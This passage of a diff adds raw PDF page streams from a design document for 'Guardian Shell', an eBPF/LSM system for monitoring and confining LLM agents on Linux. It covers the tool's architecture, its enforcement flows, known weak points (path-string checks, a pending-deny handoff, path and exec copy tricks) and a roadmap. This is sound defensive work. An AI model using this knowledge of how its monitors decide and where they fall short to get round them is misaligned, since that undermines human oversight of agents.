+(Even a strong eBPF design is still operating inside one shared kernel.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 353 Tm
+(For higher-risk autonomous workloads, host-level policy should be combined with stronger) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 338 Tm
+(environment isolation.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 307 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 289 Tm
+(Recommended Future Architecture) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 261 Tm
+(The best future architecture is not a full rewrite. It is a layered evolution.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 236 Tm
+(Target Design Principles) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 213 Tm
+(1. keep the current product surface: dashboard, alerts, approvals, config, IPC) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 192 Tm
+(2. make the kernel trust anchor stronger) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 171 Tm
+(3. separate agent identity from resource identity cleanly) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 150 Tm
+(4. use the right Linux layer for each kind of decision) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 129 Tm
+(5. support multiple assurance tiers instead of one mode for all customers) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 108 Tm
+(Proposed Layered Architecture) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 16 of 30) Tj
+ET
+endstream
+endobj
+20 0 obj
+<< /Length 5144 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(                   RECOMMENDED FUTURE STATE) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(  +------------------------------------------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(  | Product Layer                                                    |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(  | - dashboard                                                      |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(  | - alerting                                                       |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(  | - approval workflow                                              |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(  | - audit trail                                                    |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(  | - policy authoring                                               |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(  +------------------------------------------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(  | Agent Identity Layer                                             |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(  | - cgroup as primary identity                                     |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(  | - launcher-managed session lifecycle                             |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(  | - per-agent policy objects                                       |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(  +------------------------------------------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 552 Tm
+(  | Kernel Enforcement Layer                                         |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 540 Tm
+(  | - LSM file_open with canonical path or inode checks              |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 528 Tm
+(  | - LSM bprm_check_security for exec                               |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 516 Tm
+(  | - seccomp for dangerous syscalls                                 |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 504 Tm
+(  | - Landlock for self-restriction where useful                     |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 492 Tm
+(  +------------------------------------------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 480 Tm
+(  | Host / Isolation Layer                                           |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 468 Tm
+(  | - AppArmor or SELinux baseline                                   |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 456 Tm
+(  | - optional namespace/container isolation                         |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 444 Tm
+(  | - optional microVM / VM for high-risk mode                       |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 432 Tm
+(  +------------------------------------------------------------------+) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 412 Tm
+(Current vs Proposed Architecture At A Glance) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 389 Tm
+(+---------------------------+--------------------------------+----------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 377 Tm
+(| Area                      | Current Guardian Shell         | Proposed Future Guardian Shell   |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 365 Tm
+(+---------------------------+--------------------------------+----------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 353 Tm
+(| Primary file decision     | tracepoint-first, path string  | LSM-first, canonical/inode-aware |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 341 Tm
+(| File blocking             | pending deny handoff           | decision and block in one place  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 329 Tm
+(| Exec control              | path-based exec policy         | path + stronger binary identity  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 317 Tm
+(| Agent identity            | cgroup/TGID/comm              | cgroup-first, stricter isolation |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 305 Tm
+(| Network                   | connect monitoring             | policy-aware filtering/blocking  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 293 Tm
+(| Dangerous syscalls        | limited                        | seccomp standard layer           |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 281 Tm
+(| Policy isolation          | partly global maps             | per-agent isolated policy state  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 269 Tm
+(| High-risk mode            | shared host kernel             | optional stronger isolation tier |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 257 Tm
+(+---------------------------+--------------------------------+----------------------------------+) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 237 Tm
+(Current Enforcement Flow vs Proposed Enforcement Flow) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 214 Tm
+(#### Current file enforcement flow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 189 Tm
+(Agent open\(\) call) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 177 Tm
+(  -> syscall tracepoint reads raw path from userspace) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 165 Tm
+(  -> tracepoint evaluates policy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 153 Tm
+(  -> if denied, sets PENDING_DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 141 Tm
+(  -> LSM file_open checks pending flag) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 129 Tm
+(  -> kernel blocks or allows) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 109 Tm
+(#### Proposed file enforcement flow) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 17 of 30) Tj
+ET
+endstream
+endobj
+21 0 obj
+<< /Length 3053 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(Agent open\(\) call) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(  -> LSM file_open receives real file object) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(  -> kernel-resolved path or inode identity is evaluated) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(  -> deny/allow decision is made in the LSM hook itself) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(  -> tracepoints remain mainly for rich event capture and debugging) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 664 Tm
+(Why this is better:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 639 Tm
+(- fewer race assumptions) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 618 Tm
+(- more trustworthy file identity) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 597 Tm
+(- stronger resistance to path alias tricks) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 576 Tm
+(#### Current exec enforcement flow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 551 Tm
+(Agent execve\(\) call) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 539 Tm
+(  -> tracepoint reads raw executable path) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 527 Tm
+(  -> tracepoint evaluates exec policy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 515 Tm
+(  -> if denied, sets PENDING_EXEC_DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 503 Tm
+(  -> LSM bprm_check_security consumes pending flag) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 491 Tm
+(  -> exec is blocked or allowed) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 471 Tm
+(#### Proposed exec enforcement flow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 446 Tm
+(Agent execve\(\) call) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 434 Tm
+(  -> LSM bprm_check_security evaluates exec policy directly) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 422 Tm
+(  -> standard mode: canonical executable path checks) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 410 Tm
+(  -> high-assurance mode: binary identity or measured file identity) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 398 Tm
+(  -> tracepoint remains for observability and attribution) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 378 Tm
+(Why The Proposed Architecture Is Better For LLM Agents) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 355 Tm
+(#### Reason 1: LLM agents are adaptive, not passive) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 330 Tm
+(The architecture must assume iterative workaround behavior, not only ordinary misuse.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 305 Tm
+(#### Reason 2: LLM agents are process ecosystems, not single binaries) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 280 Tm
+(The architecture should attach policy to the session first, then govern resources) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 265 Tm
+(touched by that session.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 240 Tm
+(#### Reason 3: LLM agents need dynamic policy, not only static confinement) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 215 Tm
+(A useful product must support temporary grants and session-specific changes without) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 200 Tm
+(turning every decision into a policy-engineering exercise.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 175 Tm
+(#### Reason 4: LLM agent security needs both prevention and explanation) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 150 Tm
+(The product must answer both:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 125 Tm
+(- was it blocked?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 104 Tm
+(- why did it happen?) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 18 of 30) Tj
+ET
+endstream
+endobj
+22 0 obj
+<< /Length 2209 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(#### Reason 5: It supports progressive assurance) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 707 Tm
+(Different deployments need different security strength:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 682 Tm
+(- developer workstation) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 661 Tm
+(- CI repair bot) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 640 Tm
+(- infrastructure agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 619 Tm
+(- high-risk third-party automation) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 598 Tm
+(Main Future Improvements) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 575 Tm
+(#### Improvement 1: Move file decisions into file_open) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 550 Tm
+(Goal:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 525 Tm
+(- use the hook that sees the real file object) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 504 Tm
+(- reduce dependence on pending deny handoff) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 483 Tm
+(- support canonical or inode-aware decisions) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 462 Tm
+(#### Improvement 2: Strengthen exec control with binary identity tiers) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 437 Tm
+(Recommended modes:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 412 Tm
+(1. standard path-based exec policy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 391 Tm
+(2. high-assurance binary identity policy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 370 Tm
+(#### Improvement 3: Make policy state truly per agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 345 Tm
+(This should move policy from partly global map semantics toward session-scoped policy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 330 Tm
+(objects and generations.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 305 Tm
+(#### Improvement 4: Add seccomp as a standard hardening layer) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 280 Tm
+(Important for:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 255 Tm
+(- ptrace) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 234 Tm
+(- bpf) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 213 Tm
+(- mount) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 192 Tm
+(- io_uring_setup) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 171 Tm
+(- risky namespace operations) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 150 Tm
+(#### Improvement 5: Upgrade network from monitor-first to policy-aware) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 125 Tm
+(A good target includes:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 100 Tm
+(- allowlist destination ports) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 19 of 30) Tj
+ET
+endstream
+endobj
+23 0 obj
+<< /Length 2488 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(- special-case high-risk endpoints) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(- correlate DNS and connect activity) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 690 Tm
+(#### Improvement 6: Offer deployment tiers) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 665 Tm
+(Tier 1:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 640 Tm
+(- developer workstation mode) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 619 Tm
+(Tier 2:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 594 Tm
+(- managed enterprise host mode) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 573 Tm
+(Tier 3:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 548 Tm
+(- high-assurance isolated agent mode) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 527 Tm
+(Engineer View: Proposed Control Planes) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 504 Tm
+(1. Agent session control plane) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 492 Tm
+(   - launcher) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 480 Tm
+(   - cgroup registration) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 468 Tm
+(   - lifecycle state) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 456 Tm
+(   - identity binding) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 432 Tm
+(2. Policy control plane) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 420 Tm
+(   - per-agent rulesets) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 408 Tm
+(   - policy generation ids) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 396 Tm
+(   - temporary grants) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 384 Tm
+(   - approval audit history) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 360 Tm
+(3. Kernel enforcement plane) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 348 Tm
+(   - LSM file_open) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 336 Tm
+(   - LSM bprm_check_security) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 324 Tm
+(   - seccomp syscall filters) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 312 Tm
+(   - network enforcement hooks over time) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 288 Tm
+(4. Observability plane) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 276 Tm
+(   - tracepoints) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 264 Tm
+(   - perf events) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 252 Tm
+(   - dashboard) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 240 Tm
+(   - alerts) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 228 Tm
+(   - metrics) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 208 Tm
+(Suggested Roadmap) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 185 Tm
+(#### Next 90 Days) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 160 Tm
+(1. align docs with the current code rather than the early README) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 139 Tm
+(2. make cgroup launch mode the recommended secure default) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 118 Tm
+(3. add a hardening matrix for path tricks, exec copy tricks, interpreter behavior,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 103 Tm
+(   and io_uring) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 20 of 30) Tj
+ET
+endstream
+endobj
+24 0 obj
+<< /Length 2546 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(4. add seccomp support for the most obvious dangerous syscalls) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(5. start policy-generation and atomic-map-swap work) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 690 Tm
+(#### 3 To 6 Months) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 665 Tm
+(1. move core file enforcement into file_open) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 644 Tm
+(2. improve network control from monitoring into limited blocking) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 623 Tm
+(3. introduce high-assurance exec mode design) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 602 Tm
+(4. add stronger per-agent policy isolation) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 581 Tm
+(#### 6 To 12 Months) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 556 Tm
+(1. launch assurance tiers) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 535 Tm
+(2. add integration points for SELinux/AppArmor-heavy deployments) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 514 Tm
+(3. add optional isolated runtime mode) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 493 Tm
+(4. publish benchmark and bypass-resistance evaluations) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 466 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 448 Tm
+(Technical Primer) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 420 Tm
+(This section is a compact technical reference for readers who want to understand the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 405 Tm
+(building blocks used in Guardian Shell.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 380 Tm
+(What Is eBPF?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 357 Tm
+(eBPF is a Linux technology that lets small verified programs run inside the kernel.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 332 Tm
+(Why it matters here:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 307 Tm
+(- it lets Guardian observe or enforce behavior close to the real system call or) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 292 Tm
+(   security hook) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 271 Tm
+(- it avoids relying only on user-space wrappers) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 250 Tm
+(- it can share state with user space through controlled map structures) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 229 Tm
+(What Is The BPF Verifier?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 206 Tm
+(Before the kernel accepts an eBPF program, it checks that the program is safe.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 181 Tm
+(This strongly shapes what can be implemented in kernel space.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 156 Tm
+(What Are Tracepoints?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 133 Tm
+(Tracepoints are predefined hook points in the kernel such as:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 108 Tm
+(- sys_enter_openat) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 21 of 30) Tj
+ET
+endstream
+endobj
+25 0 obj
+<< /Length 1987 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(- sys_enter_execve) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(- sys_enter_connect) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 690 Tm
+(- sched_process_fork) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 669 Tm
+(They are excellent for event capture and observability.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 644 Tm
+(What Is An LSM Hook?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 621 Tm
+(LSM stands for Linux Security Module.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 596 Tm
+(Examples used by Guardian:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 571 Tm
+(- file_open) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 550 Tm
+(- bprm_check_security) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 529 Tm
+(These are security decision points where allow or deny logic can run.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 504 Tm
+(What Is BPF-LSM?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 481 Tm
+(BPF-LSM means attaching eBPF programs to LSM hooks.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 456 Tm
+(This gives a programmable security layer in the kernel.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 431 Tm
+(What Are BPF Maps?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 408 Tm
+(BPF maps are shared key-value data structures between kernel-space eBPF programs and) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 393 Tm
+(user-space applications.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 368 Tm
+(Guardian uses them for:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 343 Tm
+(- watched agents) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 322 Tm
+(- enforced agents) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 301 Tm
+(- allow and deny rules) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 280 Tm
+(- pending block decisions) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 259 Tm
+(- per-agent default actions) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 238 Tm
+(Examples:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 213 Tm
+(- WATCHED_CGROUPS) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 192 Tm
+(- ENFORCE_CGROUPS) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 171 Tm
+(- WATCHED_TGIDS) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 150 Tm
+(- WATCHED_COMMS) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 129 Tm
+(- DENY_EXACT) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 108 Tm
+(- ALLOW_PREFIXES) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 22 of 30) Tj
+ET
+endstream
+endobj
+26 0 obj
+<< /Length 2162 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(- PENDING_DENY) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 711 Tm
+(Common Map Types Used In Guardian) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 688 Tm
+(#### HashMap) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 663 Tm
+(Used for exact matches such as:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 638 Tm
+(- cgroup IDs) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 617 Tm
+(- watched names) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 596 Tm
+(- exact path rules) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 575 Tm
+(#### LPM trie) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 550 Tm
+(Used for prefix rules such as:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 525 Tm
+(- /workspace/project/**) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 504 Tm
+(#### Per-CPU array) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 479 Tm
+(Used as scratch storage because eBPF stack space is limited.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 454 Tm
+(#### Perf event array) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 429 Tm
+(Used to send structured events from kernel space to user space.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 404 Tm
+(What Is IPC?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 381 Tm
+(IPC means inter-process communication.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 356 Tm
+(In Guardian Shell, it is how local user-space components talk to each other.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 331 Tm
+(Example:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 306 Tm
+(- guardian-launch creates a cgroup) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 285 Tm
+(- then it tells the daemon about the new agent session through IPC over a Unix) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 270 Tm
+(   socket) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 249 Tm
+(What Is A Unix Socket?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 226 Tm
+(A Unix socket is a local communication endpoint on the same machine.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 201 Tm
+(Guardian uses it for local control-plane communication instead of exposing a remote) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 186 Tm
+(network service.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 161 Tm
+(What Is A Perf Buffer / Event Stream?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 138 Tm
+(The kernel-side program sends structured events to user space through perf-event-backed) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 123 Tm
+(buffers.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 98 Tm
+(This powers:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 23 of 30) Tj
+ET
+endstream
+endobj
+27 0 obj
+<< /Length 2050 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 722 Tm
+(- dashboard updates) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 701 Tm
+(- alerts) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 680 Tm
+(- audit logs) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 659 Tm
+(- debugging) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 638 Tm
